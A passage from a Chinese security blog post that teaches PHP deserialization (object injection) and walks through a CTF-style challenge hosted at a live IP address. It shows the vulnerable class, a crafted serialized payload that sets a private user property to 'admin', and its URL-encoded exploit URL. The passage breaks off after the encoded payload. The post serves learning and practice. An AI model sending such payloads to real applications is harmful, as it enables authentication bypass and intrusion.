@@ -1,0 +1,463 @@
+<link rel="stylesheet" href="/js/APlayer.min.css"/><div id="aplayer"></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/aplayer@1.10.0/dist/APlayer.min.js"></script><script type="text/javascript" src="/js/music.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>PHP反序列化注入 | Bonjour Hacker</title><meta name="author" content="zi0wi15on"><meta name="copyright" content="zi0wi15on"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="介绍为什么会有序列化为了解决 PHP 对象传递的一个问题，PHP文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策；但是又不能永远不让它被销毁，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，当我们下次要用的时候只要反序列化一下就可 实现过程函数php 将数据序列化和反序列化会用到两个函数  serialize()        将对象">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP反序列化注入">
+<meta property="og:url" content="https://zi0wi15on.top/2023/03/04/20230304-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Bonjour Hacker">
+<meta property="og:description" content="介绍为什么会有序列化为了解决 PHP 对象传递的一个问题，PHP文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策；但是又不能永远不让它被销毁，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，当我们下次要用的时候只要反序列化一下就可 实现过程函数php 将数据序列化和反序列化会用到两个函数  serialize()        将对象">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/03/05/sT8IWXuza5PChQ7.png">
+<meta property="article:published_time" content="2023-03-04T12:45:00.000Z">
+<meta property="article:modified_time" content="2023-03-06T12:45:00.000Z">
+<meta property="article:author" content="zi0wi15on">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/03/05/sT8IWXuza5PChQ7.png"><link rel="shortcut icon" href="/personal/favicon32.ico"><link rel="canonical" href="https://zi0wi15on.top/2023/03/04/20230304-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":30,"languages":{"author":"作者: zi0wi15on","link":"链接: ","source":"来源: Bonjour Hacker","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#868686","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'PHP反序列化注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-06 20:45:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3"/></pre></li><link rel="preconnect" href="https://T36950RIKQ-dsn.algolia.net" crossorigin /><link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js"></script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Bonjour Hacker" type="application/atom+xml">
+</head><body><link rel="stylesheet" href="/personal/loading-bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/personal/profile.jpg" onerror="onerror=null;src='/personal/404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-screwdriver-wrench"></i><span> 工具</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-fingerprint"></i><span> 自制</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/terminal/"><i class="fa-fw fas fa-person-digging"></i><span> 开发中</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/03/05/sT8IWXuza5PChQ7.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Bonjour Hacker"><img class="site-icon" src="/personal/hacker.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fas fa-comment-dots"></i><span> 留言</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-screwdriver-wrench"></i><span> 工具</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-fingerprint"></i><span> 自制</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/terminal/"><i class="fa-fw fas fa-person-digging"></i><span> 开发中</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PHP反序列化注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-04T12:45:00.000Z" title="发表于 2023-03-04 20:45:00">2023-03-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-06T12:45:00.000Z" title="更新于 2023-03-06 20:45:00">2023-03-06</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PHP反序列化注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="为什么会有序列化"><a href="#为什么会有序列化" class="headerlink" title="为什么会有序列化"></a>为什么会有序列化</h2><p>为了解决 PHP 对象传递的一个问题，PHP文件在执行结束以后就会将对象销毁，那么如果下次有一个页面恰好要用到刚刚销毁的对象就会束手无策；但是又不能永远不让它被销毁，于是人们就想出了一种能长久保存对象的方法，这就是 PHP 的序列化，当我们下次要用的时候只要反序列化一下就可</p>
+<h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>php 将数据序列化和反序列化会用到两个函数</p>
+<ul>
+<li><p><code>serialize()</code>        将对象格式化成有序的字符串</p>
+</li>
+<li><p><code>unserialize()</code>    将字符串还原成原来的对象</p>
+</li>
+</ul>
+<p>序列化是以整个对象为单位进行传输, 而序列化一个对象将会保存对象的所有变量，但<mark>不会保存对象的方法</mark>，只会保存类的名字</p>
+<p>如果了解底层的同学可以知道，类中的方法本就不在类中</p>
+<h3 id="public、protected、private"><a href="#public、protected、private" class="headerlink" title="public、protected、private"></a>public、protected、private</h3><p>PHP 对属性或方法的<strong>访问控制</strong>，是通过在前面添加<strong>修饰符</strong>来实现的</p>
+<ul>
+<li><p>public：公有的类成员可以在<strong>任何地方被访问</strong></p>
+</li>
+<li><p>protected：受保护的类成员则可以<strong>被其自身以及其子类和父类访问</strong></p>
+</li>
+<li><p>private：私有的类成员则<strong>只能被其定义所在的类访问</strong>（有可能是父类定义，子类继承但无法访问，此时序列化时标注的类名为父类）</p>
+</li>
+</ul>
+<p><mark>不同修饰符序列化后的值不一样</mark></p>
+<ul>
+<li><p>public：属性被序列化的时候属性值会变成属性名</p>
+</li>
+<li><p>protected：属性被序列化的时候属性值会变成\x00*\x00属性名</p>
+</li>
+<li><p>private：属性被序列化的时候属性值会变成\x00类名\x00属性名</p>
+</li>
+</ul>
+<p>其中：\x00表示空字符，<strong>但是还是占用一个字符位置</strong>，这个在对序列化后的字符串尝试做修改的时候尤为重要</p>
+<h3 id="用例"><a href="#用例" class="headerlink" title="用例"></a>用例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;zi0wi15on&#x27;</span>;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$sex</span> = <span class="string">&#x27;male&#x27;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span> = <span class="string">&#x27;20&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test1</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$object</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$object1</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$object</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$object1</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>PHP5.6 运行结果：</p>
+<p><img src="https://s2.loli.net/2023/03/04/lVqPmX81nYAG6HT.png" alt=""></p>
+<h3 id="php7-1-反序列化对类属性不敏感"><a href="#php7-1-反序列化对类属性不敏感" class="headerlink" title="php7.1+反序列化对类属性不敏感"></a>php7.1+反序列化对类属性不敏感</h3><h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p><strong>序列化和反序列化本身没有问题</strong>，但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数，就会导致安全问题</p>
+<p>常见的，当程序在进行反序列化时，会调用一些函数，但是如果传入函数的参数可以被用户控制的话，用户可以输入一些恶意代码到函数中，从而导致反序列化漏洞</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a>是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作</p>
+<p>PHP 将所有以<code>__</code>（两个下划线）开头的类方法保留为魔术方法。 因此，除非覆盖 PHP 的行为，否则不建议使用此类方法名称</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>常见的魔术方法</th>
+<th>触发条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>__construct()</td>
+<td>类的构造函数，对象创建时触发，但unserialize()时不会自动调用</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>类的析构函数，对象销毁前触发</td>
+</tr>
+<tr>
+<td>__sleep()</td>
+<td>对象被序列化前触发</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>在反序列化后触发</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>调用类不可访问或不存在的方法时触发</td>
+</tr>
+<tr>
+<td>__callStatic()</td>
+<td>调用类不可访问或不存在的静态方法时触发</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>调用类不可访问或不存在的属性时触发</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>设置类不可访问或不存在的属性时触发</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>当对不可访问的属性调用isset()或empty()时触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>当对不可访问的属性调用unset()时触发</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>把类当作字符串使用时触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>将对象调用为函数时触发</td>
+</tr>
+<tr>
+<td>__autoload()</td>
+<td>调用不存在的类时触发</td>
+</tr>
+<tr>
+<td>__clone()</td>
+<td>对象复制完成时触发</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>魔术方法带例详解（ <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwlww/p/8413418.html">https://www.cnblogs.com/wwlww/p/8413418.html</a> ）</p>
+<h2 id="从序列化到反序列化的魔术方法的执行顺序"><a href="#从序列化到反序列化的魔术方法的执行顺序" class="headerlink" title="从序列化到反序列化的魔术方法的执行顺序"></a>从序列化到反序列化的魔术方法的执行顺序</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()</span><br><span class="line"><span class="title function_ invoke__">__sleep</span>()</span><br><span class="line"><span class="title function_ invoke__">serialize</span>()</span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>()</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()</span><br><span class="line"><span class="title function_ invoke__">__toString</span>()</span><br><span class="line"><span class="title function_ invoke__">__destruct</span>()</span><br></pre></td></tr></table></figure>
+<h2 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h2><p>__toString() 的触发条件比较多，也因为这个原因容易被忽略，以下为常见的触发条件</p>
+<ul>
+<li><p><code>echo($obj)</code> 或 <code>print($obj)</code>，即输出对象时会触发</p>
+</li>
+<li><p>反序列化对象与字符串连接时（将对象的类型转换为字符串）</p>
+</li>
+<li><p>反序列化对象参与格式化字符串时（将对象的类型转换为字符串）</p>
+</li>
+<li><p>反序列化对象与字符串使用<code>==</code>比较时（PHP进行==比较时会转换参数类型）</p>
+</li>
+<li><p>反序列化对象参与格式化SQL语句时，一般为绑定参数操作</p>
+</li>
+<li><p>反序列化对象在经过php字符串函数时，如 strlen()、addslashes()</p>
+</li>
+<li><p>在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串时</p>
+</li>
+<li><p>反序列化的对象作为 class_exists() 的参数时</p>
+</li>
+</ul>
+<h1 id="实践-对象注入"><a href="#实践-对象注入" class="headerlink" title="实践 - 对象注入"></a>实践 - 对象注入</h1><h2 id="注入基本套路"><a href="#注入基本套路" class="headerlink" title="注入基本套路"></a>注入基本套路</h2><ol>
+<li><p>复制序列化的源代码片段</p>
+</li>
+<li><p>注释掉和属性不相关的内容</p>
+</li>
+<li><p>给属性赋值</p>
+</li>
+<li><p>输出序列化字符串，输出时强烈建议进行url编码，若在本地存储更推荐采用base64编码的形式：<code>urlencode()</code></p>
+</li>
+</ol>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="http://122.114.252.87:1126/unserialize/">http://122.114.252.87:1126/unserialize/</a></p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="复制序列化的源代码片段"><a href="#复制序列化的源代码片段" class="headerlink" title="复制序列化的源代码片段"></a>复制序列化的源代码片段</h3><p>网页为http协议，</p>
+<p>大致观察了一下，除了那一句标志性的话语，以及一个音乐播放器外，没有其他可点击的功能键或超链接</p>
+<p><img src="https://s2.loli.net/2023/03/05/Uc1qlKRBvVTG5er.png" alt=""></p>
+<p>右键“查看源代码操作”，发现隐藏的php代码段</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&quot;Y1ng&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;user == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you are not my admin!&quot;</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(@<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="注释掉和属性不相关的内容"><a href="#注释掉和属性不相关的内容" class="headerlink" title="注释掉和属性不相关的内容"></a>注释掉和属性不相关的内容</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&quot;Y1ng&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// function __destruct()</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     if ($this-&gt;user == &quot;admin&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//         echo $flag;</span></span><br><span class="line">    <span class="comment">//     &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//         echo &quot;you are not my admin!&quot;;</span></span><br><span class="line">    <span class="comment">//         exit;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $exp = $_GET[&#x27;exp&#x27;];</span></span><br><span class="line"><span class="comment">// unserialize(@$exp);</span></span><br></pre></td></tr></table></figure>
+<h3 id="给属性赋值"><a href="#给属性赋值" class="headerlink" title="给属性赋值"></a>给属性赋值</h3><p>此时给属性赋什么值，我们还是要回到代码</p>
+<p>观察到这里出现了一个魔术方法<code>__destruct()</code></p>
+<p>这个析构函数里，定义了销毁对象<strong>前</strong>的处理，其中最亮眼的无非就是<code>echo $flag;</code></p>
+<p>当然要执行该语句的话，需要满足<code>$this-&gt;user == &quot;admin&quot;</code>，那么很显然我们接下来的目标就是给属性user赋个”admin”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="输出序列化字符串"><a href="#输出序列化字符串" class="headerlink" title="输出序列化字符串"></a>输出序列化字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+<p>输出结果</p>
+<p><img src="https://s2.loli.net/2023/03/05/iHSbet9W7gfmclI.png" alt=""></p>
+<p>实际上，当我们熟练了编程语言的序列化规则后，我们也可以自己编写出一条用于对象注入的序列化字符串</p>
+<p>当然，非常重要的还是上面提到的三个修饰符对序列化字符串格式造成的影响</p>
+<h3 id="url参数注入"><a href="#url参数注入" class="headerlink" title="url参数注入"></a>url参数注入</h3><p>此时我们还未知页面表单的提交方式是<code>get</code>还是<code>post</code>，那不妨先试试get方法提交</p>
+<h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>直接在浏览器的url输入栏上给当前url注入参数，格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#&#123;当前url&#125;/?&#123;变量1&#125;=&#123;值&#125;&amp;&#123;变量2&#125;=&#123;值&#125;&amp;&#123;变量3&#125;=&#123;值&#125;&amp;&#123;……&#125;</span><br><span class="line"></span><br><span class="line">#本次参数注入的完整url</span><br><span class="line">http://122.114.252.87:1126/unserialize/?exp=O:5:&quot;Login&quot;:1:&#123;s:11:&quot;Loginuser&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>结果并没有打印出我们想要的flag……</p>
+<hr>
+<p>分析之后，我发现了其中的缘故</p>
+<ul>
+<li><p>要么是真的需要使用post方式提交</p>
+</li>
+<li><p>有没有可能我们忽略了url编码解码这一环节？</p>
+</li>
+</ul>
+<p>基于此，我决定先尝试后者</p>
+<h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>我们在打印序列化字符串前，不妨再添加一个base64编码的函数进行处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
+<p>输出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A5%3A%22Login%22%3A1%3A%7Bs%3A11%3A%22%00Login%00user%22%3Bs%3A5%3A%22admin%22%3B%7D</span><br></pre></td></tr></table></figure>
+<p>修改参数注入的完整url并提交</p>
